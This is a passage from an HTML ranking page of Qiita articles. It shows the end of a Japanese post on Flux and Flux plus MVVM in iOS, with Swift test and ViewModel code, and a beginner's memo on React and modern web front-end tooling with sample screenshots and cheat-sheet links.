                    <span class="k">guard</span> <span class="kd">let</span> <span class="nv">firstRepository</span> <span class="p">=</span> <span class="n">repositories</span><span class="p">.</span><span class="bp">first</span><span class="p">,</span> <span class="kd">let</span> <span class="nv">lastPageInfo</span> <span class="p">=</span> <span class="n">lastPageInfo</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="n">XCTFail</span><span class="p">()</span>
                        <span class="k">return</span>
                    <span class="p">}</span>
                    <span class="n">XCTAssertEqual</span><span class="p">(</span><span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">firstRepository</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
                    <span class="n">XCTAssertEqual</span><span class="p">(</span><span class="n">lastPageInfo</span><span class="p">.</span><span class="n">hasNextPage</span><span class="p">,</span> <span class="n">pageInfo</span><span class="p">.</span><span class="n">hasNextPage</span><span class="p">)</span>
                    <span class="n">XCTAssertEqual</span><span class="p">(</span><span class="n">repositoryTotalCount</span><span class="p">,</span> <span class="n">totalCount</span><span class="p">)</span>
                    <span class="n">expectation</span><span class="p">.</span><span class="n">fulfill</span><span class="p">()</span>
                <span class="p">})</span>

        <span class="n">action</span><span class="p">.</span><span class="n">fetchRepositories</span><span class="p">(</span><span class="n">withUserId</span><span class="p">:</span> <span class="s">"marty-suzuki"</span><span class="p">,</span> <span class="n">after</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>

        <span class="n">waitForExpectations</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">handler</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
        <span class="n">disposable</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="考察-2" class="fragment"></span><a href="#%E8%80%83%E5%AF%9F-2"><i class="fa fa-link"></i></a>考察</h3>

<p>Fluxではデータフローが単一方向になるので</p>

<ul>
<li>Actionではメソットの呼び出し</li>
<li>Storeから値を参照</li>
</ul>

<p>という形で責務を明確にすることができます。<br>
そういった良い部分もある中で</p>

<ul>
<li>プレゼンテーション層に関するロジックがViewControllerに実装されがち</li>
<li>Dispatcherはシングルトンで実装される（場合によってはStoreも）</li>
</ul>

<p>という懸念点もあります。</p>

<h1>
<span id="to-be-continued" class="fragment"></span><a href="#to-be-continued"><i class="fa fa-link"></i></a>To Be Continued</h1>

<p>番外編としてFluxとMVVMを組み合わせた実装に関しての資料を紹介だけさせていただいていました。<br>
9/7に開催されたBrooklyn Swift Developersというmeetupでの登壇資料です。</p>

<blockquote class="twitter-tweet">
<p>Thank you for giving me a great opportunity to talk in an international meetup! <br>This is my talk slide! <a href="https://twitter.com/BKLNSwift" rel="nofollow noopener" target="_blank">@BKLNSwift</a><a href="https://t.co/NFDWMBgbwT" rel="nofollow noopener" target="_blank">https://t.co/NFDWMBgbwT</a></p>— marty-suzuki (@marty_suzuki) <a href="https://twitter.com/marty_suzuki/status/906011781050449921" rel="nofollow noopener" target="_blank">September 8, 2017</a>
</blockquote>



<p>またFluxとMVVMを組み合わせた実装のサンプルは下記のURLからご覧いただけます。<br>
<a href="https://github.com/marty-suzuki/FluxCapacitor/tree/master/Examples/Flux%2BMVVM" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/marty-suzuki/FluxCapacitor/tree/master/Examples/Flux%2BMVVM</a></p>

<h2>
<span id="flux--mvvm" class="fragment"></span><a href="#flux--mvvm"><i class="fa fa-link"></i></a>Flux &amp; MVVM</h2>

<p>Fluxではプレゼンテーション層に関するロジックがViewControllerに実装されがちですが、そこにViewModelを挟むことによって改善されます。<br>
まず、<code>FavoriteViewController</code>でのFlux単体でのデータフローは下図のようになります。</p>

<p><a href="https://camo.qiitausercontent.com/85d95d85b34efdfac49fa99453b2ff1317c22278/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f38383235316462302d653530642d303762632d303835342d3430616336623734316464612e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/85d95d85b34efdfac49fa99453b2ff1317c22278/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f38383235316462302d653530642d303762632d303835342d3430616336623734316464612e6a706567" alt="flux_mvvm.001.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/88251db0-e50d-07bc-0854-40ac6b741dda.jpeg"></a></p>

<p>そこにViewModelを挟むと下図のようになります。</p>

<p><a href="https://camo.qiitausercontent.com/b5a4e8b50aaba7bcf88423685d5073921dd660e2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f63323139643130302d313862372d626561302d626239612d3563613038363939633563382e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b5a4e8b50aaba7bcf88423685d5073921dd660e2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f63323139643130302d313862372d626561302d626239612d3563613038363939633563382e6a706567" alt="flux_mvvm.002.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/c219d100-18b7-bea0-bb9a-5ca08699c5c8.jpeg"></a></p>

<p><code>FavoriteViewModel</code>では<code>RepositoryStore</code>で公開されているObservableを変換して、<code>reloadData: Observable&lt;Void&gt;</code>として外部に公開します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewModel</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewModel</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>

    <span class="kd">let</span> <span class="nv">reloadData</span><span class="p">:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">_reloadData</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;()</span>
    <span class="kd">let</span> <span class="nv">showRepository</span><span class="p">:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">_showRepository</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;()</span>
    <span class="p">...</span>
    <span class="kd">init</span><span class="p">(...,</span>
         <span class="n">store</span><span class="p">:</span> <span class="n">RepositoryStore</span> <span class="p">=</span> <span class="p">.</span><span class="n">instantiate</span><span class="p">(),</span>
         <span class="p">...)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">store</span> <span class="p">=</span> <span class="n">store</span>
        <span class="p">...</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">reloadData</span> <span class="p">=</span> <span class="n">_reloadData</span>
        <span class="p">...</span>
        <span class="n">store</span><span class="p">.</span><span class="n">favorites</span>
            <span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="kc">_</span> <span class="k">in</span> <span class="p">}</span>
            <span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="n">_reloadData</span><span class="p">)</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoriteViewController</code>では<code>FavoriteViewModel</code>で公開されているreloadDataを<code>reloadData: AnyObserver&lt;Void&gt;</code>にbindし、<code>tableView.reloadData()</code>を実行します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewController</span><span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>
    <span class="p">...</span>
    <span class="kd">private</span><span class="p">(</span><span class="kr">set</span><span class="p">)</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">viewModel</span><span class="p">:</span> <span class="n">FavoriteViewModel</span> <span class="p">=</span> <span class="p">{</span>
       <span class="p">...</span>
    <span class="p">}()</span>
    <span class="p">...</span>
    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewDidLoad</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewDidLoad</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="n">viewModel</span><span class="p">.</span><span class="n">reloadData</span>
            <span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="n">reloadData</span><span class="p">)</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
        <span class="p">...</span>
    <span class="p">}</span>

    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">reloadData</span><span class="p">:</span> <span class="n">AnyObserver</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">UIBindingObserver</span><span class="p">(</span><span class="n">UIElement</span><span class="p">:</span> <span class="kc">self</span><span class="p">)</span> <span class="p">{</span> <span class="n">me</span><span class="p">,</span> <span class="kc">_</span> <span class="k">in</span>
            <span class="n">me</span><span class="p">.</span><span class="n">tableView</span><span class="p">.</span><span class="n">reloadData</span><span class="p">()</span>
        <span class="p">}.</span><span class="n">asObserver</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p>プレゼンテーション層のロジックがViewModelに実装されているため、ViewControllerではViewModelの公開されているObservableが該当のViewにbindされる実装になります。<br>
そのため、ViewControllerをTestCaseに置き換えることで、容易にテストするとこが可能になります。</p>

<p><a href="https://camo.qiitausercontent.com/c53278ada6187ed36f9dc8d7ea0db2b36e089582/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f62653130613038652d343339362d376531612d313537382d6362306364353531366536632e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c53278ada6187ed36f9dc8d7ea0db2b36e089582/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f62653130613038652d343339362d376531612d313537382d6362306364353531366536632e6a706567" alt="flux_mvvm.003.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/be10a08e-4396-7e1a-1578-cb0cd5516e6c.jpeg"></a></p>

<p><code>FavoriteViewModelTestCase</code>では、<code>FavoriteViewModel</code>のinitializerで<code>RepositoryAction</code>と<code>RepositoryStore</code>を渡しています。<br>
<code>testReloadData()</code>では、<code>RepositoryAction</code>の<code>addFavorite(_:)</code>に<code>Repository</code>を渡すと<code>viewModel.reloadData</code>が実行されるかのテストを行っています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewModelTestCase</span></div>
<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FavoriteViewModelTestCase</span><span class="p">:</span> <span class="n">XCTestCase</span> <span class="p">{</span>

    <span class="kd">var</span> <span class="nv">action</span><span class="p">:</span> <span class="n">RepositoryAction</span><span class="p">!</span>
    <span class="kd">var</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span><span class="p">!</span>
    <span class="p">...</span>
    <span class="kd">var</span> <span class="nv">viewModel</span><span class="p">:</span> <span class="n">FavoriteViewModel</span><span class="p">!</span>
    <span class="p">...</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">setUp</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">setUp</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">action</span> <span class="p">=</span> <span class="n">RepositoryAction</span><span class="p">(...)</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">store</span> <span class="p">=</span> <span class="n">RepositoryStore</span><span class="p">.</span><span class="n">instantiate</span><span class="p">()</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">viewModel</span> <span class="p">=</span> <span class="n">FavoriteViewModel</span><span class="p">(</span><span class="n">action</span><span class="p">:</span> <span class="n">action</span><span class="p">,</span> <span class="n">store</span><span class="p">:</span> <span class="n">store</span><span class="p">,</span> <span class="p">...)</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">testReloadData</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">expectation</span> <span class="p">=</span> <span class="kc">self</span><span class="p">.</span><span class="n">expectation</span><span class="p">(</span><span class="n">description</span><span class="p">:</span> <span class="s">"testReloadData expectation"</span><span class="p">)</span>

        <span class="kd">let</span> <span class="nv">disposable</span> <span class="p">=</span> <span class="n">viewModel</span><span class="p">.</span><span class="n">reloadData</span>
            <span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">onNext</span><span class="p">:</span> <span class="p">{</span>
                <span class="n">expectation</span><span class="p">.</span><span class="n">fulfill</span><span class="p">()</span>
            <span class="p">})</span>

        <span class="n">action</span><span class="p">.</span><span class="n">addFavorite</span><span class="p">(</span><span class="n">Repository</span><span class="p">.</span><span class="n">mock</span><span class="p">())</span>

        <span class="n">waitForExpectations</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">handler</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
        <span class="n">disposable</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="最後に" class="fragment"></span><a href="#%E6%9C%80%E5%BE%8C%E3%81%AB"><i class="fa fa-link"></i></a>最後に</h1>

<p>MVC、MVP、MVVM、Fluxを比較してきましたがどのデザインパターンが良いというわけではなく、<strong>"開発しているサービスにとってどのデザインパターンが必要十分なのか"</strong>が重要だと考えています。<br>
その要因はとして、アプリの規模だったり、アプリの性質だったり、開発している人数だったりと様々あるかと思います。<br>
また実際にプロジェクトに導入する際には、それぞれのデザインパターンの簡単なサンプルを実装してみないと良し悪しはわからず机上の空論にしかならなので、是非サンプルを作ってみてください。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">52位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>191</kbd>
		<a target="_blank" href="https://qiita.com/akimach/items/af3ba7841bcb789b75a5">イマドキWebフロントエンド環境とReactを触りながらサンプルを10本書いてみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-10<br />21:36:13</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/119738.html">akimach</a>(19件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/119738/profile-images/1487782554">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[HTML]</b> <b>[jQuery]</b> <b>[reactjs]</b> <b>[React]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>Webフロントエンドの知識がjQueryで知識が止まっていたので、モダンなWebフロントエンドに触れてみた。そのメモ。</p>

<h2>
<span id="良かった点" class="fragment"></span><a href="#%E8%89%AF%E3%81%8B%E3%81%A3%E3%81%9F%E7%82%B9"><i class="fa fa-link"></i></a>良かった点</h2>

<p>「今はこうなっているのかー」と分かった。今後はナウい記事を読んでもビビらないと思う。</p>

<h2>
<span id="reactのすごさ" class="fragment"></span><a href="#react%E3%81%AE%E3%81%99%E3%81%94%E3%81%95"><i class="fa fa-link"></i></a>Reactのすごさ</h2>

<p>触ってみて下の記事のいうことが理解できた。何がすごいの？と聞かれたら下の記事を掻い摘んで説明したい。</p>

<ul>
<li><a href="https://qiita.com/naruto/items/fdb61bc743395f8d8faf" id="reference-1639608b82c5a5a9afbc">Reactを使うとなぜjQueryが要らなくなるのか</a></li>
</ul>

<h2>
<span id="触ってみたもの" class="fragment"></span><a href="#%E8%A7%A6%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%9F%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>触ってみたもの</h2>

<ul>
<li>ES6</li>
<li>Yarn</li>
<li>Webpack</li>
<li>Babel</li>
<li>Sass/SCSS</li>
<li>React</li>
</ul>

<p>とりあえずエディタ開いてHTMLを書くぞというタイプの人間だったので、フロントエンド開発にまずはコマンドラインを打って環境を構築する点が新鮮。自動化できるところはツールで共通化してラクできるところはラクをする、というのは分かった。Reactは使うか分からないが、Webpack/Babel/SCSSは絶対に使うと思う。</p>

<h2>
<span id="作ってみたもの" class="fragment"></span><a href="#%E4%BD%9C%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%9F%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>作ってみたもの</h2>

<p>以下サンプル。いくつかはドキュメントをそのまま写経したものがある。</p>

<h3>
<span id="github-repo" class="fragment"></span><a href="#github-repo"><i class="fa fa-link"></i></a>Github repo</h3>

<ul>
<li><a href="https://github.com/akimach/react-remix-10" rel="nofollow noopener" target="_blank">akimach/react-remix-10</a></li>
</ul>

<h3>
<span id="01-hello" class="fragment"></span><a href="#01-hello"><i class="fa fa-link"></i></a>01 Hello</h3>

<p><a href="https://camo.qiitausercontent.com/2941457007711bfd3fccddb406745653fe1fcc33/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363535392d37393230323330342d633633302d313165372d393035632d3461646466323265396565612e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2941457007711bfd3fccddb406745653fe1fcc33/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363535392d37393230323330342d633633302d313165372d393035632d3461646466323265396565612e6a7067" alt="01" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646559-79202304-c630-11e7-905c-4addf22e9eea.jpg"></a></p>

<h3>
<span id="02-router" class="fragment"></span><a href="#02-router"><i class="fa fa-link"></i></a>02 Router</h3>

<p>react router</p>

<p><a href="https://reacttraining.com/react-router/web/guides/" class="autolink" rel="nofollow noopener" target="_blank">https://reacttraining.com/react-router/web/guides/</a> のサンプル</p>

<p><a href="https://camo.qiitausercontent.com/18124e3e05153eefad6cd40541bb0356fa591a97/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536302d37393830613133652d633633302d313165372d393032352d3730353232323533623730332e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/18124e3e05153eefad6cd40541bb0356fa591a97/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536302d37393830613133652d633633302d313165372d393032352d3730353232323533623730332e6a7067" alt="02" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646560-7980a13e-c630-11e7-9025-70522253b703.jpg"></a></p>

<h3>
<span id="03-material-ui" class="fragment"></span><a href="#03-material-ui"><i class="fa fa-link"></i></a>03 Material-UI</h3>

<p>material ui </p>

<p><a href="https://camo.qiitausercontent.com/b0a6adbe2f92a40b8e2dd8531271b119b90693d2/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536312d37396362663739632d633633302d313165372d393436342d3839383164313561643631632e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b0a6adbe2f92a40b8e2dd8531271b119b90693d2/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536312d37396362663739632d633633302d313165372d393436342d3839383164313561643631632e6a7067" alt="03" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646561-79cbf79c-c630-11e7-9464-8981d15ad61c.jpg"></a></p>

<h3>
<span id="04-chart" class="fragment"></span><a href="#04-chart"><i class="fa fa-link"></i></a>04 Chart</h3>

<p>react chartjs 2</p>

<p><a href="https://camo.qiitausercontent.com/3934f2ad6289872c2efcfb05c3a278d7cf4a4313/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536332d37613562663039612d633633302d313165372d386233612d3265656335326530626436392e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/3934f2ad6289872c2efcfb05c3a278d7cf4a4313/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536332d37613562663039612d633633302d313165372d386233612d3265656335326530626436392e6a7067" alt="04" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646563-7a5bf09a-c630-11e7-8b3a-2eec52e0bd69.jpg"></a></p>

<h3>
<span id="05-todo-list" class="fragment"></span><a href="#05-todo-list"><i class="fa fa-link"></i></a>05 Todo List</h3>

<p><a href="https://camo.qiitausercontent.com/205d573dd44f956d7aa19e97e5825f828771bbf5/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536342d37613935383863382d633633302d313165372d383734362d6462656632666261363437302e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/205d573dd44f956d7aa19e97e5825f828771bbf5/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536342d37613935383863382d633633302d313165372d383734362d6462656632666261363437302e6a7067" alt="05" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646564-7a9588c8-c630-11e7-8746-dbef2fba6470.jpg"></a></p>

<h3>
<span id="06-editor" class="fragment"></span><a href="#06-editor"><i class="fa fa-link"></i></a>06 Editor</h3>

<p>Markd</p>

<p><a href="https://camo.qiitausercontent.com/8c6aba81453f8d11c98ac7a1a1bd9b6cc8aef0bd/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363832372d64653534656232382d633633312d313165372d386230372d3732303638303230306236342e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8c6aba81453f8d11c98ac7a1a1bd9b6cc8aef0bd/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363832372d64653534656232382d633633312d313165372d386230372d3732303638303230306236342e6a7067" alt="06" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646827-de54eb28-c631-11e7-8b07-720680200b64.jpg"></a></p>

<h3>
<span id="07-form" class="fragment"></span><a href="#07-form"><i class="fa fa-link"></i></a>07 Form</h3>

<p><a href="https://camo.qiitausercontent.com/66ffe6b6cda245b753e4de2d3cb3a9ea28d43c51/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536352d37616537343230382d633633302d313165372d393434372d3037346664616336323863312e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/66ffe6b6cda245b753e4de2d3cb3a9ea28d43c51/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536352d37616537343230382d633633302d313165372d393434372d3037346664616336323863312e6a7067" alt="07" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646565-7ae74208-c630-11e7-9447-074fdac628c1.jpg"></a></p>

<h3>
<span id="08-hacker-news" class="fragment"></span><a href="#08-hacker-news"><i class="fa fa-link"></i></a>08 Hacker News</h3>

<p>Hacker News Reader</p>

<p><a href="https://camo.qiitausercontent.com/b20333eb3bf7d039098e90a409e1c9d46a8a01b9/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536362d37623164396431632d633633302d313165372d386230622d3338366134383764623337362e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b20333eb3bf7d039098e90a409e1c9d46a8a01b9/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536362d37623164396431632d633633302d313165372d386230622d3338366134383764623337362e6a7067" alt="08" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646566-7b1d9d1c-c630-11e7-8b0b-386a487db376.jpg"></a></p>

<h3>
<span id="09-google-maps" class="fragment"></span><a href="#09-google-maps"><i class="fa fa-link"></i></a>09 Google Maps</h3>

<p>react-google-map</p>

<p><a href="https://camo.qiitausercontent.com/7f217fc2a6aa90ef5c39b33a25dcdf12f339881c/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536372d37623538316537342d633633302d313165372d383565622d6133393233373836646362342e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7f217fc2a6aa90ef5c39b33a25dcdf12f339881c/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536372d37623538316537342d633633302d313165372d383565622d6133393233373836646362342e6a7067" alt="09" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646567-7b581e74-c630-11e7-85eb-a3923786dcb4.jpg"></a></p>

<h3>
<span id="10-redux" class="fragment"></span><a href="#10-redux"><i class="fa fa-link"></i></a>10 Redux</h3>

<p><a href="https://mae.chab.in/archives/2885" rel="nofollow noopener" target="_blank">Reduxの実装とReactとの連携を超シンプルなサンプルを使って解説</a>のサンプルコードをいじったやつ</p>

<p><a href="https://camo.qiitausercontent.com/8075eb0045956f0c57c75bd34ed42cb169c687ea/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536382d37623931353338382d633633302d313165372d396533372d6261363737643231396432632e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8075eb0045956f0c57c75bd34ed42cb169c687ea/68747470733a2f2f757365722d696d616765732e67697468756275736572636f6e74656e742e636f6d2f31373537303236352f33323634363536382d37623931353338382d633633302d313165372d396533372d6261363737643231396432632e6a7067" alt="10" data-canonical-src="https://user-images.githubusercontent.com/17570265/32646568-7b915388-c630-11e7-9e37-ba677d219d2c.jpg"></a></p>

<h2>
<span id="チートシート" class="fragment"></span><a href="#%E3%83%81%E3%83%BC%E3%83%88%E3%82%B7%E3%83%BC%E3%83%88"><i class="fa fa-link"></i></a>チートシート</h2>

<p>困ったらみる。</p>

<ul>
<li><a href="https://devhints.io/es6" class="autolink" rel="nofollow noopener" target="_blank">https://devhints.io/es6</a></li>
<li><a href="https://gist.github.com/revolunet/537a3448cff850231a74" class="autolink" rel="nofollow noopener" target="_blank">https://gist.github.com/revolunet/537a3448cff850231a74</a></li>
<li><a href="https://devhints.io/webpack" class="autolink" rel="nofollow noopener" target="_blank">https://devhints.io/webpack</a></li>
<li><a href="https://shift.infinite.red/npm-vs-yarn-cheat-sheet-8755b092e5cc" class="autolink" rel="nofollow noopener" target="_blank">https://shift.infinite.red/npm-vs-yarn-cheat-sheet-8755b092e5cc</a></li>
<li><a href="https://gist.github.com/hofmannsven/b219051467f86f2ac469" class="autolink" rel="nofollow noopener" target="_blank">https://gist.github.com/hofmannsven/b219051467f86f2ac469</a></li>
<li><a href="https://devhints.io/sass" class="autolink" rel="nofollow noopener" target="_blank">https://devhints.io/sass</a></li>
<li><a href="https://devhints.io/react" class="autolink" rel="nofollow noopener" target="_blank">https://devhints.io/react</a></li>
<li><a href="https://devhints.io/react-router" class="autolink" rel="nofollow noopener" target="_blank">https://devhints.io/react-router</a></li>
<li><a href="https://reactcheatsheet.com" class="autolink" rel="nofollow noopener" target="_blank">https://reactcheatsheet.com</a></li>
<li><a href="https://github.com/uanders/react-redux-cheatsheet" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/uanders/react-redux-cheatsheet</a></li>
</ul>

<h2>
<span id="awesome" class="fragment"></span><a href="#awesome"><i class="fa fa-link"></i></a>Awesome</h2>

<p>網羅的な記事。</p>

<ul>
<li><a href="https://github.com/enaqx/awesome-react" rel="nofollow noopener" target="_blank">enaqx/awesome-react</a></li>
<li><a href="https://github.com/brillout/awesome-react-components" rel="nofollow noopener" target="_blank">brillout/awesome-react-components</a></li>
</ul>

<h1>
<span id="おわりに" class="fragment"></span><a href="#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB"><i class="fa fa-link"></i></a>おわりに</h1>

<p>学んでみて新鮮だったし楽しかった。ここしばらくWebフロントエンドは書いてないけど、久しぶりに何かサービスを作りたくなった。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">53位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>187</kbd>
